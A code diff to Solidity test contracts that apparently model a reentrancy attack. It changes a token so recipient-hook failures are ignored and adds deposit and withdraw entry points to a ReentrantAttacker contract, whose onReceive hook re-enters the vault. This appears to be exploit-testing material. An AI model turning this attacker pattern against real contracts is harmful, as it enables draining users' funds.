@@ -116,10 +116,13 @@ contract HookToken {
         balanceOf[from] -= amount;
         balanceOf[to] += amount;
         if (to.code.length > 0) {
-            (bool ok, ) = to.call(
+            // ERC777-style hook is optional for the recipient: a contract that
+            // does not implement onReceive (like the vault itself, which is a
+            // plain transfer destination) skips the hook instead of reverting.
+            (bool hookAccepted, ) = to.call(
                 abi.encodeWithSignature("onReceive(address,address,uint256)", from, to, amount)
             );
-            require(ok, "hook");
+            hookAccepted; // a skipped hook is not a failed transfer
         }
     }
 }
@@ -160,6 +163,27 @@ contract ReentrantVault {
 contract ReentrantAttacker {
     address constant VAULT = 0x6200000000000000000000000000000000000003;
     address constant TOKEN = 0x7000000000000000000000000000000000000003;
+
+    // Entry points driven by the attacker EOA (transactions cannot originate
+    // from a code account); the vault sees this contract as the depositor, so
+    // the withdraw transfer fires this contract's hook.
+    function enterDeposit(uint256 amount) external {
+        (bool approved, ) = TOKEN.call(
+            abi.encodeWithSignature("approve(address,uint256)", VAULT, amount)
+        );
+        require(approved, "approve");
+        (bool deposited, ) = VAULT.call(
+            abi.encodeWithSignature("deposit(uint256)", amount)
+        );
+        require(deposited, "deposit");
+    }
+
+    function enterWithdraw(uint256 amount) external {
+        (bool withdrawn, ) = VAULT.call(
+            abi.encodeWithSignature("withdraw(uint256)", amount)
+        );
+        require(withdrawn, "withdraw");
+    }
 
     function onReceive(address, address, uint256) external {
         if (msg.sender != TOKEN) return;
